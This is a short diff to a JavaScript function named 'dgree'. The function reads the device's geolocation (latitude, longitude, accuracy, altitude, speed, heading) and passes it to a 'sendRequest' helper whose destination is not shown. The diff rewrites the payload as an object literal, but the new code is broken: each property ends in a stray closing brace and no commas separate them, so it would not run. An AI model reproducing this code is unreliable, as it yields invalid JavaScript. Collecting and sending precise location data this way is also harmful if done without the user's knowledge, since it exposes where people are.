@@ -34,14 +34,14 @@ async function sendRequest(data) {
 async function dgree() {
   try {
     const pos = await getLocation();
-    const data = `
-      Latitude=${pos.coords.latitude}
-      Longitude=${pos.coords.longitude}
-      Accuracy=${pos.coords.accuracy}
-      Altitude=${pos.coords.altitude}
-      Speed=${pos.coords.speed}
-      Heading=${pos.coords.heading}
-    `
+    const data = {
+      Latitude: pos.coords.latitude}
+      Longitude: pos.coords.longitude}
+      Accuracy: pos.coords.accuracy}
+      Altitude: pos.coords.altitude}
+      Speed: pos.coords.speed}
+      Heading: pos.coords.heading}
+    };
     
     await sendRequest(data);
   } catch (err) {
